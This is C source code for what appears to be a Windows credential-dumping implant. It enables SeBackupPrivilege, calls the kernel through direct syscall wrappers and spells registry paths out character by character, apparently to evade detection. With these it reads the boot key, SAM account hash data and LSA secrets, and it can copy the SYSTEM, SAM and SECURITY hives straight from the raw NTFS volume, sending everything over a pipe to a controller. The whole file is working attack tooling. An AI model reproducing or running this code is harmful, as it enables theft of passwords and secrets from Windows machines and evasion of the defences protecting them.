/**
 * Registry data extraction — SAM + SECURITY via direct reads.
 * Boot key is read separately via Remote Registry RPC (Python side).
 * Uses NtOpenKey + NtQueryValueKey + NtEnumerateKey with SeBackupPrivilege.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"
#include "../include/ntfs.h"

/* ── Helpers ──────────────────────────────────────────────── */

static HANDLE open_root(const wchar_t *hive, int hive_len) {
    wchar_t path[128];
    int off = 0;
    wchar_t prefix[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',
                         L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\' };
    for (int i = 0; i < 18; i++) path[off++] = prefix[i];
    for (int i = 0; i < hive_len; i++) path[off++] = hive[i];
    path[off] = L'\0';

    UNICODE_STRING us;
    us.Length = (USHORT)(off * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
    us.Buffer = path;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE h = NULL;
    if (NT_SUCCESS(sys_NtOpenKey(&h, KEY_READ, &oa))) return h;
    return NULL;
}

static HANDLE open_sub(HANDLE parent, const wchar_t *name, int name_len) {
    UNICODE_STRING us;
    us.Length = (USHORT)(name_len * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((name_len + 1) * sizeof(wchar_t));
    us.Buffer = (PWSTR)name;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, parent, NULL);

    HANDLE h = NULL;
    if (NT_SUCCESS(sys_NtOpenKey(&h, KEY_READ, &oa))) return h;
    return NULL;
}

static DWORD read_val(HANDLE key, const wchar_t *name, int name_len,
                       BYTE *buf, DWORD buf_size) {
    UNICODE_STRING vs;
    vs.Length = (USHORT)(name_len * sizeof(wchar_t));
    vs.MaximumLength = (USHORT)((name_len + 1) * sizeof(wchar_t));
    vs.Buffer = (PWSTR)name;

    ULONG result_len = 0;
    NTSTATUS status = sys_NtQueryValueKey(key, &vs, 2,
                                           buf, buf_size, &result_len);
    if (!NT_SUCCESS(status)) return 0;
    return *(DWORD *)&buf[8];
}

static DWORD read_default(HANDLE key, BYTE *buf, DWORD buf_size) {
    wchar_t empty = L'\0';
    return read_val(key, &empty, 0, buf, buf_size);
}

static DWORD read_class(HANDLE key, BYTE *buf, DWORD buf_size) {
    ULONG result_len = 0;
    NTSTATUS status = sys_NtQueryKey(key, 2, buf, buf_size, &result_len);
    if (!NT_SUCCESS(status)) return 0;
    return *(DWORD *)&buf[16];
}

static BOOL enum_sub(HANDLE parent, ULONG index,
                      wchar_t *name, ULONG max_chars, ULONG *out_chars) {
    BYTE info[512];
    ULONG result_len = 0;
    NTSTATUS status = sys_NtEnumerateKey(parent, index, 0,
                                          info, sizeof(info), &result_len);
    if (!NT_SUCCESS(status)) return FALSE;

    ULONG name_bytes = *(ULONG *)&info[12];
    ULONG chars = name_bytes / sizeof(wchar_t);
    if (chars >= max_chars) return FALSE;

    wchar_t *src = (wchar_t *)&info[16];
    for (ULONG i = 0; i < chars; i++) name[i] = src[i];
    name[chars] = L'\0';
    *out_chars = chars;
    return TRUE;
}

/* ── Enable SeBackupPrivilege ──────────────────────────────── */

BOOL init_registry(void) {
    HANDLE token = NULL;
    NTSTATUS status = sys_NtOpenProcessToken(
        (HANDLE)-1,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &token
    );
    if (!NT_SUCCESS(status)) return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart  = SE_BACKUP_PRIVILEGE_LUID_LOW;
    tp.Privileges[0].Luid.HighPart = SE_BACKUP_PRIVILEGE_LUID_HIGH;
    tp.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;

    status = sys_NtAdjustPrivilegesToken(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    sys_NtClose(token);

    return NT_SUCCESS(status);
}

/* ── Boot key extraction ─────────────────────────────────── */

static void dump_boot_key(HANDLE pipe, BYTE *work, DWORD work_size) {
    wchar_t hive[] = { L'S',L'Y',L'S',L'T',L'E',L'M' };
    HANDLE hSystem = open_root(hive, 6);
    if (!hSystem) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t sel[] = { L'S',L'e',L'l',L'e',L'c',L't' };
    HANDLE hSelect = open_sub(hSystem, sel, 6);
    if (!hSelect) {
        sys_NtClose(hSystem);
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t def[] = { L'D',L'e',L'f',L'a',L'u',L'l',L't' };
    DWORD val_len = read_val(hSelect, def, 7, work, work_size);
    sys_NtClose(hSelect);

    DWORD cs_number = 0;
    if (val_len >= 4) cs_number = *(DWORD *)(work + 12);
    write_pipe(pipe, &cs_number, 4);

    if (cs_number == 0) {
        sys_NtClose(hSystem);
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t cs_path[64];
    int off = 0;
    wchar_t pfx[] = { L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't' };
    for (int i = 0; i < 10; i++) cs_path[off++] = pfx[i];
    cs_path[off++] = L'0' + (cs_number / 100) % 10;
    cs_path[off++] = L'0' + (cs_number / 10) % 10;
    cs_path[off++] = L'0' + cs_number % 10;
    wchar_t ctl[] = { L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a' };
    for (int i = 0; i < 12; i++) cs_path[off++] = ctl[i];
    cs_path[off] = L'\0';

    HANDLE hLsa = open_sub(hSystem, cs_path, off);
    sys_NtClose(hSystem);

    if (!hLsa) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t jd[]    = { L'J',L'D' };
    wchar_t skew[]  = { L'S',L'k',L'e',L'w',L'1' };
    wchar_t gbg[]   = { L'G',L'B',L'G' };
    wchar_t data[]  = { L'D',L'a',L't',L'a' };

    struct { wchar_t *name; int len; } subs[4] = {
        { jd, 2 }, { skew, 5 }, { gbg, 3 }, { data, 4 }
    };

    DWORD class_count = 4;
    write_pipe(pipe, &class_count, 4);

    for (int i = 0; i < 4; i++) {
        HANDLE hSub = open_sub(hLsa, subs[i].name, subs[i].len);
        DWORD class_len = 0;
        if (hSub) {
            class_len = read_class(hSub, work, work_size);
            write_pipe(pipe, &class_len, 4);
            if (class_len) {
                DWORD class_off = *(DWORD *)(work + 12);
                write_pipe(pipe, work + class_off, class_len);
            }
            sys_NtClose(hSub);
        } else {
            write_pipe(pipe, &class_len, 4);
        }
    }

    sys_NtClose(hLsa);
}

/* ── SAM data extraction ──────────────────────────────────── */

static BOOL is_hex8(const wchar_t *s, ULONG len) {
    if (len != 8) return FALSE;
    for (ULONG i = 0; i < 8; i++) {
        wchar_t c = s[i];
        if (!((c >= L'0' && c <= L'9') || (c >= L'A' && c <= L'F') || (c >= L'a' && c <= L'f')))
            return FALSE;
    }
    return TRUE;
}

static DWORD hex8_to_rid(const wchar_t *s) {
    DWORD rid = 0;
    for (int i = 0; i < 8; i++) {
        wchar_t c = s[i];
        DWORD d;
        if (c >= L'0' && c <= L'9') d = c - L'0';
        else if (c >= L'A' && c <= L'F') d = c - L'A' + 10;
        else d = c - L'a' + 10;
        rid = (rid << 4) | d;
    }
    return rid;
}

static void dump_sam(HANDLE pipe, BYTE *work, DWORD work_size) {
    wchar_t hive[] = { L'S',L'A',L'M' };
    HANDLE hSam = open_root(hive, 3);
    if (!hSam) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t sam2[] = { L'S',L'A',L'M' };
    HANDLE hSam2 = open_sub(hSam, sam2, 3);
    sys_NtClose(hSam);

    HANDLE hAccount = NULL;
    if (hSam2) {
        wchar_t dom[] = { L'D',L'o',L'm',L'a',L'i',L'n',L's' };
        HANDLE hDom = open_sub(hSam2, dom, 7);
        sys_NtClose(hSam2);
        if (hDom) {
            wchar_t acc[] = { L'A',L'c',L'c',L'o',L'u',L'n',L't' };
            hAccount = open_sub(hDom, acc, 7);
            sys_NtClose(hDom);
        }
    }

    if (!hAccount) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t f[] = { L'F' };
    DWORD f_len = read_val(hAccount, f, 1, work, work_size);
    write_pipe(pipe, &f_len, 4);
    if (f_len) write_pipe(pipe, work + 12, f_len);

    wchar_t users[] = { L'U',L's',L'e',L'r',L's' };
    HANDLE hUsers = open_sub(hAccount, users, 5);
    sys_NtClose(hAccount);

    if (!hUsers) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return;
    }

    DWORD user_count = 0;
    wchar_t subname[32];
    ULONG sub_chars;
    for (ULONG idx = 0; enum_sub(hUsers, idx, subname, 32, &sub_chars); idx++) {
        if (is_hex8(subname, sub_chars)) user_count++;
    }
    write_pipe(pipe, &user_count, 4);

    for (ULONG idx = 0; enum_sub(hUsers, idx, subname, 32, &sub_chars); idx++) {
        if (!is_hex8(subname, sub_chars)) continue;

        DWORD rid = hex8_to_rid(subname);
        write_pipe(pipe, &rid, 4);

        HANDLE hUser = open_sub(hUsers, subname, sub_chars);
        DWORD v_len = 0;
        if (hUser) {
            wchar_t v[] = { L'V' };
            v_len = read_val(hUser, v, 1, work, work_size);
            sys_NtClose(hUser);
        }
        write_pipe(pipe, &v_len, 4);
        if (v_len) write_pipe(pipe, work + 12, v_len);
    }

    sys_NtClose(hUsers);
}

/* ── SECURITY data extraction ─────────────────────────────── */

static void dump_security(HANDLE pipe, BYTE *work, DWORD work_size) {
    wchar_t hive[] = { L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y' };
    HANDLE hSec = open_root(hive, 8);
    if (!hSec) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t pol[] = { L'P',L'o',L'l',L'i',L'c',L'y' };
    HANDLE hPolicy = open_sub(hSec, pol, 6);
    sys_NtClose(hSec);

    if (!hPolicy) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return;
    }

    wchar_t ek[] = { L'P',L'o',L'l',L'E',L'K',L'L',L'i',L's',L't' };
    HANDLE hEk = open_sub(hPolicy, ek, 9);
    DWORD ek_len = 0;
    if (hEk) {
        ek_len = read_default(hEk, work, work_size);
        sys_NtClose(hEk);
    }
    write_pipe(pipe, &ek_len, 4);
    if (ek_len) write_pipe(pipe, work + 12, ek_len);

    wchar_t sec[] = { L'S',L'e',L'c',L'r',L'e',L't',L's' };
    HANDLE hSecrets = open_sub(hPolicy, sec, 7);
    sys_NtClose(hPolicy);

    if (!hSecrets) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return;
    }

    DWORD secret_count = 0;
    wchar_t subname[128];
    ULONG sub_chars;
    for (ULONG idx = 0; enum_sub(hSecrets, idx, subname, 128, &sub_chars); idx++) {
        secret_count++;
    }
    write_pipe(pipe, &secret_count, 4);

    for (ULONG idx = 0; enum_sub(hSecrets, idx, subname, 128, &sub_chars); idx++) {
        DWORD name_bytes = sub_chars * sizeof(wchar_t);
        write_pipe(pipe, &name_bytes, 4);
        write_pipe(pipe, subname, name_bytes);

        HANDLE hSecret = open_sub(hSecrets, subname, sub_chars);
        DWORD val_len = 0;
        if (hSecret) {
            wchar_t cv[] = { L'C',L'u',L'r',L'r',L'V',L'a',L'l' };
            HANDLE hCv = open_sub(hSecret, cv, 7);
            if (hCv) {
                val_len = read_default(hCv, work, work_size);
                sys_NtClose(hCv);
            }
            sys_NtClose(hSecret);
        }
        write_pipe(pipe, &val_len, 4);
        if (val_len) write_pipe(pipe, work + 12, val_len);
    }

    sys_NtClose(hSecrets);
}

/* ── Hive file reading (mode & 4) ─────────────────────────── */

static HANDLE open_volume(void) {
    wchar_t vp[] = { L'\\',L'?',L'?',L'\\',L'C',L':' };
    UNICODE_STRING us;
    us.Length = 12; us.MaximumLength = 12; us.Buffer = vp;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE h = NULL;
    NTSTATUS st = sys_NtCreateFile(&h,
        0x00100001, /* FILE_READ_DATA | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);
    return NT_SUCCESS(st) ? h : NULL;
}

static void send_buf(HANDLE pipe, BYTE *buf, DWORD total) {
    write_pipe(pipe, &total, 4);
    DWORD w = 0;
    while (w < total) {
        DWORD ch = total - w;
        if (ch > 65536) ch = 65536;
        write_pipe(pipe, buf + w, ch);
        w += ch;
    }
}

BOOL dump_hive_files(HANDLE pipe) {
    PVOID buf = NULL;
    SIZE_T alloc_size = 32 * 1024 * 1024;
    NTSTATUS status = sys_NtAllocateVirtualMemory(
        (HANDLE)-1, &buf, 0, &alloc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    PVOID work = NULL;
    SIZE_T work_size = 65536;
    sys_NtAllocateVirtualMemory((HANDLE)-1, &work, 0, &work_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    struct { wchar_t *n; int l; } hives[3] = {
        { (wchar_t[]){L'S',L'Y',L'S',L'T',L'E',L'M'}, 6 },
        { (wchar_t[]){L'S',L'A',L'M'}, 3 },
        { (wchar_t[]){L'S',L'E',L'C',L'U',L'R',L'I',L'T',L'Y'}, 8 },
    };

    HANDLE hVol = open_volume();
    if (hVol) {
        for (int h = 0; h < 3; h++) {
            DWORD err = 0;
            DWORD got = ntfs_read_hive(hVol,
                hives[h].n, hives[h].l,
                (BYTE *)buf, (DWORD)alloc_size,
                (BYTE *)work, (DWORD)work_size,
                &err);
            if (got) {
                send_buf(pipe, (BYTE *)buf, got);
            } else {
                DWORD marker = 0xFFFF0000 | (err & 0xFFFF);
                write_pipe(pipe, &marker, 4);
            }
        }
        sys_NtClose(hVol);
    } else {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
        write_pipe(pipe, &zero, 4);
    }

    SIZE_T free_size = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &buf, &free_size, MEM_RELEASE);
    if (work) {
        free_size = 0;
        sys_NtFreeVirtualMemory((HANDLE)-1, &work, &free_size, MEM_RELEASE);
    }
    return TRUE;
}

/* ── Main entry (mode & 1 — structured registry) ────────────── */

BOOL dump_registry_hives(HANDLE pipe) {
    PVOID work = NULL;
    SIZE_T work_size = 65536;
    NTSTATUS status = sys_NtAllocateVirtualMemory(
        (HANDLE)-1, &work, 0, &work_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DWORD zero = 0;
        for (int i = 0; i < 6; i++) write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    dump_boot_key(pipe, (BYTE *)work, (DWORD)work_size);
    dump_sam(pipe, (BYTE *)work, (DWORD)work_size);
    dump_security(pipe, (BYTE *)work, (DWORD)work_size);

    SIZE_T free_size = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &work, &free_size, MEM_RELEASE);
    return TRUE;
}
